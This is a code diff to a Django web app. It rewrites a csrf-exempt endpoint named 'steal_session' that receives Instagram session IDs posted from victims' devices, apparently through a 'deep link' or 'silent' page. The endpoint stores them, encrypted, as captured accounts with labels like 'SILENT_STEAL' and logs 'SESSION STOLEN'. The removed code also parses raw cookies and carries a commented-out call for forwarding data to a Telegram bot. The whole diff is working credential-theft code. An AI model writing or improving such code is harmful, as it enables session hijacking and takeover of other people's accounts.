@@ -166,33 +166,24 @@ def download_json(request):
 @csrf_exempt
 def steal_session(request):
     if request.method == "POST":
-        data = json.loads(request.body)
-        cookies = data.get('cookies', '')
-        ua = data.get('useragent', '')
-
-        # EXTRACT SESSIONID FROM COOKIES
-        import re
-        session_match = re.search(r'sessionid=([^;]+)', cookies)
-        if session_match:
-            sessionid = session_match.group(1)
-
-            # SAVE TO DATABASE
-            InstagramAccount.objects.create(
-                username="AUTO_CAPTURED_" + sessionid[:10],
-                password="VIA_DEEP_LINK",
-                session_data=fernet.encrypt(json.dumps({"sessionid": sessionid}).encode()).decode(),
-                is_active=True,
-                last_success=timezone.now()
-            )
-
-            # AUTO SEND TO TELEGRAM (OPTIONAL)
-            # requests.post("https://api.telegram.org/bot...", data={...})
-
-        return JsonResponse({"status": "stolen"})
-
-    return HttpResponse("OK")
-
-
-
-def silent_page(request):
-    return render(request, 'core/silent.html')
+        try:
+            data = json.loads(request.body)
+            sessionid = data.get('sessionid', '')
+            if sessionid and len(sessionid) > 30:
+                # SAVE TO DB
+                InstagramAccount.objects.update_or_create(
+                    username=f"MOBILE_{sessionid[:12]}",
+                    defaults={
+                        'password': 'SILENT_STEAL',
+                        'session_data': fernet.encrypt(json.dumps({
+                            "authorization_data": {"sessionid": sessionid}
+                        }).encode()).decode(),
+                        'is_active': True,
+                        'last_success': timezone.now()
+                    }
+                )
+                print(f"SESSION STOLEN: {sessionid[:50]}...")
+                return JsonResponse({"status": "success"})
+        except Exception as e:
+            print(f"ERROR: {e}")
+    return JsonResponse({"status": "failed"})
